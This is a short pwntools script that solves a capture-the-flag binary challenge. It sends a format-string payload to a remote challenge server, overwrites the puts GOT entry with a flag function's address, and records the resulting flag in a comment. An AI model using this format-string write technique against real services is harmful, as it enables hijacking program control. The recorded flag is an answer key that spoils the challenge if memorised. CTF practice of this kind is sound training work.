
from pwn import *

context.clear(arch='i386')

puts = 0x0804C018
flaggy = 0x08049245

r = remote('88.198.219.20', 21890)
# r = process('./nra')

r.recvline()
r.sendline(fmtstr_payload(4, {puts: flaggy}, write_size='byte'))

print('\nFlag :', r.recvall().split()[-1:][0].decode() + '\n')

# Flag : ractf{f0rmat_Str1nG_fuN}
